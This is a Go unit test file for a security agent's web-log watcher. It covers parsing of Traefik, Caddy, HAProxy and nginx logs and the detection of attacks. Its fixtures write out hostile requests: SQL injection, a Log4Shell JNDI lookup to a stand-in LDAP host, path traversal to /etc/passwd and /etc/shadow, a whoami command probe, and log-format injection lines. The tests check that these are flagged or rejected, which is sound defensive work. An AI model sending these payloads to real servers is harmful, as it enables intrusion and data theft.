package watcher

import (
	"os"
	"path/filepath"
	"reflect"
	"sort"

	"strings"
	"sync"
	"testing"
	"time"

	"github.com/infrafence/infrafence-agent/internal/monitor"
)

const chromeUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"

// traefikJSON is a Traefik v3 JSON access log line (--accesslog.format=json
// with User-Agent kept), as Coolify's proxy writes it.
func traefikJSON(ip, host, method, path string, status int, ua string) string {
	addr := ip + ":53422"
	if strings.Contains(ip, ":") {
		addr = "[" + ip + "]:53422"
	}
	line := `{"ClientAddr":"` + addr + `","ClientHost":"` + ip + `","ClientPort":"53422","ClientUsername":"-",` +
		`"DownstreamContentSize":1543,"DownstreamStatus":` + itoa(status) + `,"Duration":12873421,"OriginContentSize":1543,` +
		`"OriginDuration":12701234,"OriginStatus":` + itoa(status) + `,"Overhead":172187,"RequestAddr":"` + host + `",` +
		`"RequestContentSize":0,"RequestCount":1842,"RequestHost":"` + host + `","RequestMethod":"` + method + `",` +
		`"RequestPath":"` + path + `","RequestPort":"-","RequestProtocol":"HTTP/2.0","RequestScheme":"https","RetryAttempts":0,` +
		`"RouterName":"https-0-qk8s0o4@docker","ServiceAddr":"10.0.1.7:9000","ServiceName":"https-0-qk8s0o4@docker",` +
		`"ServiceURL":"http://10.0.1.7:9000","StartLocal":"2026-11-06T10:15:02.118Z","StartUTC":"2026-11-06T10:15:02.118Z",` +
		`"TLSCipher":"TLS_AES_128_GCM_SHA256","TLSVersion":"1.3","entryPointName":"https","level":"info","msg":"",`
	if ua != "" {
		line += `"request_User-Agent":"` + ua + `",`
	}
	return line + `"time":"2026-11-06T10:15:02Z"}`
}

func TestParseTraefikJSON(t *testing.T) {
	e, r := parseLine(traefikJSON("203.0.113.50", "shop.example.com", "GET", "/store/products?limit=12&offset=0", 200, chromeUA), "")
	if r != parseOK || e.format != formatTraefikJSON || e.ip != "203.0.113.50" || e.domain != "shop.example.com" ||
		e.method != "GET" || e.uri != "/store/products?limit=12&offset=0" || e.status != 200 || e.userAgent != chromeUA ||
		e.router != "https-0-qk8s0o4@docker" {
		t.Fatalf("got %+v (%v)", e, r)
	}
	// IPv6, and no User-Agent kept.
	e, r = parseLine(traefikJSON("2001:db8::50", "shop.example.com:443", "POST", "/store/carts", 200, ""), "")
	if r != parseOK || e.ip != "2001:db8::50" || e.domain != "shop.example.com" || e.userAgent != "" {
		t.Fatalf("ipv6: got %+v (%v)", e, r)
	}
	// Only ClientAddr (host:port).
	e, r = parseLine(`{"ClientAddr":"[2001:db8::51]:41000","RequestHost":"a.example.com","RequestMethod":"GET","RequestPath":"/","DownstreamStatus":404}`, "")
	if r != parseOK || e.ip != "2001:db8::51" || e.status != 404 {
		t.Fatalf("ClientAddr: got %+v (%v)", e, r)
	}
	// IPv4-mapped address.
	e, _ = parseLine(`{"ClientHost":"::ffff:203.0.113.52","RequestPath":"/","DownstreamStatus":200}`, "")
	if e.ip != "203.0.113.52" {
		t.Fatalf("mapped: %q", e.ip)
	}
	// Traefik's own log lines are skipped, not failures.
	for _, l := range []string{
		`{"level":"error","error":"accept tcp [::]:443: use of closed network connection","entryPointName":"https","time":"2026-11-06T10:15:02Z","message":"Error while starting server"}`,
		`{"level":"info","ts":1762424000.1,"logger":"tls.obtain","msg":"certificate obtained successfully","identifier":"blog.example.com"}`,
	} {
		if _, r := parseLine(l, ""); r != parseSkip {
			t.Errorf("%s: %v, want skip", l, r)
		}
	}
}

func TestParseTraefikCLF(t *testing.T) {
	l := `203.0.113.50 - - [06/Nov/2026:10:15:02 +0000] "GET /store/products?limit=12 HTTP/2.0" 200 1543 "-" "` + chromeUA + `" 1842 "https-0-qk8s0o4@docker" "http://10.0.1.7:9000" 12ms`
	e, r := parseLine(l, "")
	if r != parseOK || e.format != formatTraefikCLF || e.ip != "203.0.113.50" || e.uri != "/store/products?limit=12" ||
		e.status != 200 || e.userAgent != chromeUA || e.referer != "-" || e.router != "https-0-qk8s0o4@docker" {
		t.Fatalf("got %+v (%v)", e, r)
	}
	// No router matched (Traefik's own 404), IPv6 client.
	l = `2001:db8::9 - - [06/Nov/2026:10:15:03 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 1843 "-" "-" 0ms`
	e, r = parseLine(l, "")
	if r != parseOK || e.ip != "2001:db8::9" || e.uri != "/.env" || e.status != 404 || e.router != "" {
		t.Fatalf("no router: got %+v (%v)", e, r)
	}
}

func TestParseCaddyJSON(t *testing.T) {
	l := `{"level":"info","ts":1762424102.118,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.1.3","remote_port":"51234","client_ip":"203.0.113.60","proto":"HTTP/2.0","method":"POST","host":"blog.example.com","uri":"/wp-login.php","headers":{"User-Agent":["` + chromeUA + `"],"Referer":["https://blog.example.com/"]},"tls":{"resumed":false,"version":772}},"bytes_read":0,"user_id":"","duration":0.00123,"size":4512,"status":200,"resp_headers":{"Server":["Caddy"]}}`
	e, r := parseLine(l, "")
	if r != parseOK || e.format != formatCaddyJSON || e.ip != "203.0.113.60" || e.domain != "blog.example.com" ||
		e.method != "POST" || e.uri != "/wp-login.php" || e.status != 200 || e.userAgent != chromeUA ||
		e.referer != "https://blog.example.com/" || e.bodySize != 4512 {
		t.Fatalf("got %+v (%v)", e, r)
	}
}

func TestParseHAProxy(t *testing.T) {
	for _, tc := range []struct{ line, ip, uri, domain string }{
		{`Nov  6 10:15:02 lb1 haproxy[2051]: 203.0.113.70:41822 [06/Nov/2026:10:15:02.118] https-in~ shop_backend/web1 0/0/1/12/13 200 1543 - - ---- 3/3/0/0/0 0/0 "GET /store/products?limit=12 HTTP/1.1"`,
			"203.0.113.70", "/store/products?limit=12", ""},
		{`2001:db8::70:41822 [06/Nov/2026:10:15:02.118] fe be/srv1 0/0/1/12/13 404 120 - - ---- 1/1/0/0/0 0/0 {shop.example.com|curl/8.5} "GET /.git/config HTTP/1.1"`,
			"2001:db8::70", "/.git/config", ""},
		{`Nov  6 10:15:02 lb1 haproxy[2051]: 203.0.113.71:41823 [06/Nov/2026:10:15:02.118] https-in~ be/web1 0/0/1/12/13 200 99 - - ---- 3/3/0/0/0 0/0 "GET https://shop.example.com/store/carts HTTP/2.0"`,
			"203.0.113.71", "/store/carts", "shop.example.com"},
	} {
		e, r := parseLine(tc.line, "")
		if r != parseOK || e.format != formatHAProxy || e.ip != tc.ip || e.uri != tc.uri || e.domain != tc.domain {
			t.Errorf("%s: got %+v (%v)", tc.line, e, r)
		}
	}
	// A tcplog line has no request: not an access line.
	if _, r := parseLine(`Nov  6 10:15:02 lb1 haproxy[2051]: 203.0.113.70:41822 [06/Nov/2026:10:15:02.118] smtp-in smtp/mx1 1/0/5007 212 -- 1/1/0/0/0 0/0`, ""); r == parseOK {
		t.Error("tcplog parsed as a request")
	}
}

// The combined format (nginx, Apache, LiteSpeed) parses exactly as before.
func TestParseLineCombinedUnchanged(t *testing.T) {
	for _, l := range []string{
		`203.0.113.5 - - [06/Nov/2026:10:15:02 +0000] "GET /wp-login.php HTTP/1.1" 200 4512 "https://example.com/" "` + chromeUA + `"`,
		`example.com:443 203.0.113.5 - - [06/Nov/2026:10:15:02 +0000] "POST /xmlrpc.php HTTP/1.1" 403 0 "-" "curl/8.5.0"`,
		`2001:db8::5 - - [06/Nov/2026:10:15:02 +0000] "GET /?id=1%27%20or%201=1 HTTP/1.1" 404 153 "-" "sqlmap/1.8"`,
		`203.0.113.5 - - [06/Nov/2026:10:15:02 +0000] example.com "GET / HTTP/1.1" 200 12 "-" "Mozilla/5.0"`,
	} {
		want, ok := parseAccessLog(l)
		got, r := parseLine(l, "")
		want.format = formatCombined
		if !ok || r != parseOK || !reflect.DeepEqual(got, want) {
			t.Errorf("%s:\n got %+v\nwant %+v", l, got, want)
		}
	}
}

func TestFixForwardedFor(t *testing.T) {
	l := `10.0.1.5 - - [06/Nov/2026:10:15:02 +0000] "GET / HTTP/1.1" 200 615 "-" "` + chromeUA + `" "203.0.113.80"`
	e, _ := parseAccessLog(l)
	fixForwardedFor(&e, l)
	if e.userAgent != chromeUA || e.forwardedFor != "203.0.113.80" || e.referer != "-" {
		t.Fatalf("got %+v", e)
	}
	if lastForwardedFor("198.51.100.1, 203.0.113.80") != "203.0.113.80" || lastForwardedFor("-") != "" {
		t.Fatal("lastForwardedFor")
	}
}

// ── processLine with the proxies' lines ──

type recorder struct {
	mu     sync.Mutex
	events []string // "ip type"
	bans   []string
}

func (r *recorder) watcher(sources ...LogPathInfo) *WebWatcher {
	w := NewWebWatcher(nil, nil,
		func(ip, reason string, _ int) { r.mu.Lock(); r.bans = append(r.bans, ip); r.mu.Unlock() },
		func(ip, typ, _ string, d map[string]string) {
			r.mu.Lock()
			r.events = append(r.events, ip+" "+typ+" "+d["domain"])
			r.mu.Unlock()
		})
	w.SetOnScoredBan(func(ip, _ string, _ int, _ time.Duration) {
		r.mu.Lock()
		r.bans = append(r.bans, ip)
		r.mu.Unlock()
	})
	w.SetSources(sources)
	return w
}

func (r *recorder) settle() (events, bans []string) {
	time.Sleep(500 * time.Millisecond) // events are reported from goroutines
	r.mu.Lock()
	defer r.mu.Unlock()
	events, bans = append([]string(nil), r.events...), append([]string(nil), r.bans...)
	sort.Strings(events)
	return events, bans
}

// A Medusa shop with its Next.js storefront behind Coolify's Traefik: a
// day's normal requests raise nothing.
func TestMedusaNextTrafficNoEvents(t *testing.T) {
	const host = "shop.example.com"
	type req struct {
		method, path string
		status       int
		ua           string
	}
	reqs := []req{
		{"GET", "/store/products?fields=*variants.calculated_price,+variants.inventory_quantity&region_id=reg_01JC3X&limit=12&offset=0", 200, chromeUA},
		{"GET", "/store/products/prod_01JC3XK9Q2B7?fields=*variants.calculated_price&region_id=reg_01JC3X", 200, chromeUA},
		{"GET", "/store/regions", 200, "node"},
		{"GET", "/store/collections?limit=100&offset=0", 200, "undici"},
		{"POST", "/store/carts", 200, chromeUA},
		{"POST", "/store/carts/cart_01JC3Y2K7T/line-items", 200, chromeUA},
		{"POST", "/store/carts/cart_01JC3Y2K7T/complete", 200, chromeUA},
		{"POST", "/store/payment-collections/pay_col_01JC/payment-sessions", 200, chromeUA},
		{"GET", "/store/customers/me?fields=*orders", 401, chromeUA},
		{"POST", "/auth/customer/emailpass", 200, chromeUA},
		{"POST", "/auth/customer/emailpass", 401, chromeUA}, // one wrong password
		{"POST", "/auth/session", 200, chromeUA},
		{"DELETE", "/auth/session", 200, chromeUA},
		{"POST", "/auth/token/refresh", 200, chromeUA},
		{"GET", "/app", 200, chromeUA},
		{"GET", "/app/login", 200, chromeUA},
		{"GET", "/app/orders?offset=0&order=-created_at", 200, chromeUA},
		{"POST", "/auth/user/emailpass", 200, chromeUA},
		{"GET", "/admin/users/me", 401, chromeUA},
		{"GET", "/admin/orders?fields=%2Bsummary%2C*customer%2C*sales_channel&limit=20&offset=0&order=-created_at", 200, chromeUA},
		{"GET", "/admin/products?limit=20&offset=0&order=-created_at&fields=%2Bthumbnail%2C*categories", 200, chromeUA},
		{"POST", "/admin/products/prod_01JC3XK9Q2B7", 200, chromeUA},
		{"POST", "/admin/uploads", 200, chromeUA},
		{"GET", "/admin/stores", 200, chromeUA},
		{"GET", "/admin/feature-flags", 200, chromeUA},
		{"POST", "/hooks/payment/stripe_stripe", 200, "Stripe/1.0 (+https://stripe.com/docs/webhooks)"},
		{"GET", "/_next/static/chunks/app/%5BcountryCode%5D/(main)/page-3f9a2c1d.js", 200, chromeUA},
		{"GET", "/_next/static/css/7b2d5e.css", 200, chromeUA},
		{"GET", "/_next/image?url=https%3A%2F%2Fmedusa-public-images.s3.eu-west-1.amazonaws.com%2Ftee-black-front.png&w=1080&q=75", 200, chromeUA},
		{"GET", "/us/products/t-shirt?_rsc=1x2y3", 200, chromeUA},
		{"GET", "/_next/data/build123/us/store.json?countryCode=us", 200, chromeUA},
		{"GET", "/us/checkout?step=delivery", 200, chromeUA},
		{"GET", "/us/account/orders/details/order_01JC", 200, chromeUA},
		{"GET", "/favicon.ico", 404, chromeUA},
	}
	r := &recorder{}
	src := LogPathInfo{Path: "/data/coolify/proxy/access.log", Server: "traefik", Container: "coolify-proxy"}
	w := r.watcher(src)
	for round := 0; round < 3; round++ {
		for _, q := range reqs {
			w.processLine(src.Path, traefikJSON("203.0.113.90", host, q.method, q.path, q.status, q.ua))
			w.processLine(src.Path, traefikJSON("2001:db8::90", host, q.method, q.path, q.status, q.ua))
		}
	}
	if events, bans := r.settle(); len(events) > 0 || len(bans) > 0 {
		t.Fatalf("normal shop traffic: events %v, bans %v", events, bans)
	}
	if d := w.Detection(); d.State != "off" { // nothing tailed in a unit test
		t.Fatalf("detection %+v", d)
	}
	if st := w.parseStats[src.Path]; st.parsed != uint64(6*len(reqs)) || st.format != formatTraefikJSON {
		t.Fatalf("stats %+v", st)
	}
}

func TestTraefikAttacksDetected(t *testing.T) {
	r := &recorder{}
	src := LogPathInfo{Path: "/data/coolify/proxy/access.log", Server: "traefik", Container: "coolify-proxy"}
	w := r.watcher(src)
	p := src.Path
	w.processLine(p, traefikJSON("203.0.113.66", "shop.example.com", "GET", "/store/products?id=1%27%20OR%201=1--", 400, ""))
	w.processLine(p, traefikJSON("203.0.113.66", "shop.example.com", "GET", "/?x=${jndi:ldap://198.51.100.1/a}", 404, "curl/8.5.0"))
	// The default format, IPv6.
	clf := `2001:db8::66 - - [06/Nov/2026:10:15:03 +0000] "GET /api/..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 404 19 "-" "` + chromeUA + `" 1843 "https-0-qk8s0o4@docker" "http://10.0.1.7:9000" 1ms`
	w.processLine(p, clf)
	events, bans := r.settle()
	want := []string{
		"2001:db8::66 path_traversal ",
		"203.0.113.66 rce_attempt shop.example.com",
		"203.0.113.66 sql_injection shop.example.com",
	}
	if !reflect.DeepEqual(events, want) {
		t.Fatalf("events %v, want %v", events, want)
	}
	if len(bans) != 1 || bans[0] != "203.0.113.66" {
		t.Fatalf("bans %v", bans)
	}
}

// Traefik's default format logs the router: its host comes from the labels.
func TestTraefikCLFRouterDomain(t *testing.T) {
	setDockerState(nil, map[string]string{"https-0-qk8s0o4": "shop.example.com"})
	defer setDockerState(nil, map[string]string{})
	r := &recorder{}
	w := r.watcher(LogPathInfo{Path: "docker://coolify-proxy", Server: "traefik", Container: "coolify-proxy"})
	w.processLine("docker://coolify-proxy", `203.0.113.67 - - [06/Nov/2026:10:15:03 +0000] "GET /?cmd=whoami HTTP/1.1" 404 19 "-" "`+chromeUA+`" 1843 "https-0-qk8s0o4@docker" "http://10.0.1.7:9000" 1ms`)
	w.processLine("docker://coolify-proxy", `time="2026-11-06T10:15:03Z" level=info msg="Configuration loaded from flags."`)
	events, _ := r.settle()
	if len(events) != 1 || events[0] != "203.0.113.67 scanner_detected shop.example.com" {
		t.Fatalf("events %v", events)
	}
}

func TestMedusaLoginBruteForce(t *testing.T) {
	r := &recorder{}
	src := LogPathInfo{Path: "/data/coolify/proxy/access.log", Server: "traefik"}
	w := r.watcher(src)
	for i := 0; i < 10; i++ {
		w.processLine(src.Path, traefikJSON("203.0.113.68", "shop.example.com", "POST", "/auth/user/emailpass", 401, chromeUA))
	}
	events, _ := r.settle()
	if len(events) != 1 || events[0] != "203.0.113.68 cms_bruteforce shop.example.com" {
		t.Fatalf("events %v", events)
	}
}

func TestCloudflareEdgeNeverBanned(t *testing.T) {
	r := &recorder{}
	src := LogPathInfo{Path: "/data/coolify/proxy/access.log", Server: "traefik"}
	w := r.watcher(src)
	attack := traefikJSON("172.70.1.2", "shop.example.com", "GET", "/?x=${jndi:ldap://198.51.100.1/a}", 404, chromeUA)
	w.processLine(src.Path, attack)
	withCF := strings.Replace(attack, `"time":`, `"request_Cf-Connecting-Ip":"203.0.113.69","time":`, 1)
	w.processLine(src.Path, withCF)
	events, _ := r.settle()
	if len(events) != 1 || !strings.HasPrefix(events[0], "203.0.113.69 rce_attempt") {
		t.Fatalf("events %v", events)
	}
}

// nginx in a container behind the proxy: the client is taken from
// X-Forwarded-For only for the proxy's requests.
func TestContainerBehindProxy(t *testing.T) {
	r := &recorder{}
	src := LogPathInfo{Path: "docker://shop-nginx", Server: "nginx", Container: "shop-nginx", Proxies: []string{"10.0.1.5"}}
	w := r.watcher(src)
	w.processLine(src.Path, `10.0.1.5 - - [06/Nov/2026:10:15:02 +0000] "GET /?x=${jndi:ldap://198.51.100.1/a} HTTP/1.1" 404 153 "-" "`+chromeUA+`" "203.0.113.81"`)
	// Not from the proxy: X-Forwarded-For is whatever the client sent.
	w.processLine(src.Path, `198.51.100.9 - - [06/Nov/2026:10:15:02 +0000] "GET /?id=1%27%20or%201=1 HTTP/1.1" 404 153 "-" "`+chromeUA+`" "203.0.113.99"`)
	// nginx's own output.
	w.processLine(src.Path, `2026/11/06 10:15:02 [notice] 1#1: start worker processes`)
	events, _ := r.settle()
	want := []string{"198.51.100.9 sql_injection ", "203.0.113.81 rce_attempt "}
	if !reflect.DeepEqual(events, want) {
		t.Fatalf("events %v, want %v", events, want)
	}
}

// ── Traefik configuration ──

// The command of Coolify's proxy (docker-compose.yml) with the access log on.
var coolifyArgs = []string{"/entrypoint.sh",
	"--ping=true", "--ping.entrypoint=http", "--api.dashboard=true", "--entrypoints.http.address=:80",
	"--entrypoints.https.address=:443", "--entrypoints.http.http.encodequerysemicolons=true",
	"--providers.file.directory=/traefik/dynamic/", "--providers.file.watch=true",
	"--certificatesresolvers.letsencrypt.acme.httpchallenge=true", "--certificatesresolvers.letsencrypt.acme.storage=/traefik/acme.json",
	"--providers.docker=true", "--providers.docker.exposedbydefault=false",
	"--accesslog=true", "--accesslog.format=json", "--accesslog.filepath=/traefik/access.log",
	"--accesslog.fields.headers.names.User-Agent=keep"}

func TestTraefikConfigFromArgs(t *testing.T) {
	cases := []struct {
		args []string
		want traefikAccessLog
	}{
		{coolifyArgs, traefikAccessLog{Enabled: true, FilePath: "/traefik/access.log", Format: "json"}},
		{coolifyArgs[:13], traefikAccessLog{}},
		{[]string{"traefik", "--accesslog"}, traefikAccessLog{Enabled: true}},
		{[]string{"--accessLog.filePath=/logs/a.log"}, traefikAccessLog{Enabled: true, FilePath: "/logs/a.log"}},
		{[]string{"--accesslog.format", "json"}, traefikAccessLog{Enabled: true, Format: "json"}},
		{[]string{"--accesslog=false", "--accesslog.format=json"}, traefikAccessLog{Format: "json"}},
	}
	for _, c := range cases {
		if got, _ := traefikConfigFromArgs(c.args); got != c.want {
			t.Errorf("%v: %+v, want %+v", c.args, got, c.want)
		}
	}
	got, _ := traefikConfigFromEnv([]string{"PATH=/bin", "TRAEFIK_ACCESSLOG_FILEPATH=/var/log/t.log"})
	if got != (traefikAccessLog{Enabled: true, FilePath: "/var/log/t.log"}) {
		t.Errorf("env: %+v", got)
	}
}

func TestTraefikConfigFromFile(t *testing.T) {
	yml := `global:
  sendAnonymousUsage: false
accessLog:
  filePath: "/etc/dokploy/traefik/dynamic/access.log"
  format: json
  bufferingSize: 100
entryPoints:
  web:
    address: ":80"
`
	if got := traefikConfigFromFile(yml, false); got != (traefikAccessLog{Enabled: true, FilePath: "/etc/dokploy/traefik/dynamic/access.log", Format: "json"}) {
		t.Errorf("yaml: %+v", got)
	}
	if got := traefikConfigFromFile("entryPoints:\n  web:\n    address: \":80\"\nlog:\n  filePath: /x.log\n", false); got.Enabled {
		t.Errorf("no accessLog: %+v", got)
	}
	toml := "[entryPoints.web]\n  address = \":80\"\n[accessLog]\n  filePath = \"/logs/access.log\"\n"
	if got := traefikConfigFromFile(toml, true); got != (traefikAccessLog{Enabled: true, FilePath: "/logs/access.log"}) {
		t.Errorf("toml: %+v", got)
	}
}

func TestTraefikSource(t *testing.T) {
	dir := t.TempDir()
	d := &monitor.ContainerDetails{Name: "coolify-proxy", Args: coolifyArgs[:13],
		Mounts: []monitor.DockerMount{{Type: "bind", Source: dir, Destination: "/traefik"}}}
	labels := map[string]string{"coolify.proxy": "true"}

	// Off: the hint with Coolify's settings.
	info, h := traefikSource("coolify-proxy", labels, d)
	if info != nil || h == nil || h.Reason != HintAccessLogOff || h.Platform != "coolify" || !reflect.DeepEqual(h.Settings, coolifyTraefikSettings) {
		t.Fatalf("off: %+v %+v", info, h)
	}
	// On, file not written yet.
	d.Args = coolifyArgs
	if info, h = traefikSource("coolify-proxy", labels, d); info != nil || h.Reason != HintLogFileAbsent {
		t.Fatalf("missing: %+v %+v", info, h)
	}
	// On: the host file.
	if err := os.WriteFile(filepath.Join(dir, "access.log"), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	real, _ := filepath.EvalSymlinks(filepath.Join(dir, "access.log"))
	if info, h = traefikSource("coolify-proxy", labels, d); h != nil || info.Path != real || info.Server != "traefik" {
		t.Fatalf("file: %+v %+v", info, h)
	}
	// A file no mount shows.
	d.Mounts = nil
	if info, h = traefikSource("coolify-proxy", labels, d); info != nil || h.Reason != HintLogNotOnHost {
		t.Fatalf("not on host: %+v %+v", info, h)
	}
	// Output: no file path. Elsewhere than Coolify, the generic hint.
	d.Args = []string{"traefik", "--accesslog=true"}
	if info, h = traefikSource("traefik", nil, d); h != nil || info.Path != "docker://traefik" {
		t.Fatalf("stdout: %+v %+v", info, h)
	}
	d.Args = []string{"traefik", "--providers.docker=true"}
	if _, h = traefikSource("traefik", nil, d); h == nil || h.Platform != "" || !reflect.DeepEqual(h.Settings, traefikStdoutSettings) {
		t.Fatalf("generic hint: %+v", h)
	}
}

func TestWebServerOfImage(t *testing.T) {
	for im, want := range map[string]string{
		"nginx:1.27-alpine": "nginx", "nginxinc/nginx-unprivileged:stable": "nginx", "httpd:2.4": "apache",
		"php:8.3-apache": "apache", "wordpress:6.6": "apache", "wordpress:6.6-fpm": "", "wordpress": "apache",
		"litespeedtech/openlitespeed:1.8": "litespeed", "medusajs/medusa:2": "", "postgres:16": "",
		"apache/superset:4.1": "", "apache/airflow:2.10": "", "bitnami/nginx:1.27@sha256:abc": "nginx",
	} {
		if got := webServerOfImage(im); got != want {
			t.Errorf("%s: %q, want %q", im, got, want)
		}
	}
}

// A request cannot make its own line parse as another format: a fake
// HAProxy line in the Referer and User-Agent of an nginx line, a JSON line
// in a web server container's output.
func TestNoFormatInjection(t *testing.T) {
	l := `203.0.113.7 - - [06/Nov/2026:12:00:00 +0000] "GET / HTTP/1.1" 200 5 "haproxy: 198.51.100.9:1234 [06/Nov/2026:12:00:00.000] fe be/s 0/0/0/0/0 200 5 " "GET /.env"`
	for _, server := range []string{"nginx", "apache", ""} {
		e, r := parseLine(l, server)
		if r != parseOK || e.ip != "203.0.113.7" || e.format != formatCombined {
			t.Errorf("%q: got %+v (%v)", server, e, r)
		}
	}
	j := `{"ClientHost":"198.51.100.9","RequestPath":"/.env","DownstreamStatus":404}`
	if _, r := parseLine(j, "nginx"); r == parseOK {
		t.Error("JSON parsed as a request in an nginx log")
	}
	if _, r := parseLine(j, "caddy"); r == parseOK {
		t.Error("Traefik JSON parsed as a request in a Caddy log")
	}
	// Caddy needs its access logger.
	if _, r := parseLine(`{"request":{"client_ip":"198.51.100.9","uri":"/.env"},"status":404}`, ""); r == parseOK {
		t.Error("JSON without Caddy's access logger parsed as a request")
	}
}

func TestHostPathInMount(t *testing.T) {
	dir := t.TempDir()
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "secret"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "secret"), filepath.Join(dir, "link.log")); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "access.log"), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	m := map[string]string{"/traefik": dir}
	if hostPathInMount("/traefik/access.log", m) == "" {
		t.Error("the file in the mount")
	}
	for _, p := range []string{"/traefik/../../etc/shadow", "/traefik/link.log", "traefik/access.log", "/other/access.log"} {
		if got := hostPathInMount(p, m); got != "" {
			t.Errorf("%s: %s", p, got)
		}
	}
}
